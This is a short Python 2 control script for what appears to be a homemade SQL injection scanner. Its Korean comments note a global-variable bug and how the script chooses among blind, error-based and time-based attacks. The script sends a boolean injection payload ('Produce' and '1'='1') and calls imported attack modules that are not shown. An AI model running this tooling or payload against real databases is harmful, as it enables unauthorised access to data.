# -*- coding: utf-8 -*-

import httplib
import urllib
from urlparse import urlparse
import sys
import argparse
import blind_sql as blind
import time_sql as time
import error_sql as error
import setting as set
import dbms_ck as dbck
import log as log

print("A")
set.caller_blind_httpreq("Produce' and '1'='1")


dbms, finger_scan, finger_error = dbck.check_dbms()
log.print_db_log(dbms)

#if dbms != -1:
#    time.time_based_sql(dbms)


#############Problem ...
#finger_scan의 전역변수가 말을 안들음
#전역변수로 해서 값을 변경하고 다른 파일에서 임포트해서 쓰는 경우 원래 값으로 변경이 되어있음
#심지어 원래 파일에서 전역변수 값 변경하는 것도 이상함
# ->
#Return 값을 3개 받는 방식으로 변경함

# Logic....
# 스캔인지 에러인지 확인 후
# 스캔이면 블라인드 or 타임으로 넘어가야 됨
# 에러면 걍 에러로 진행
# 스캔 에러 둘다 True이면 에러로 진행
# 둘다 아닐 경우에는 TIme or Blind based로 진행

if finger_error:
    log.print_based_log("Error Based Injection")
    error.error_based_sql(dbms)

elif finger_scan or dbms == -1:
    log.print_based_log("Time Based Injection")
    time.time_based_sql(dbms)


# else:
# blind_sql
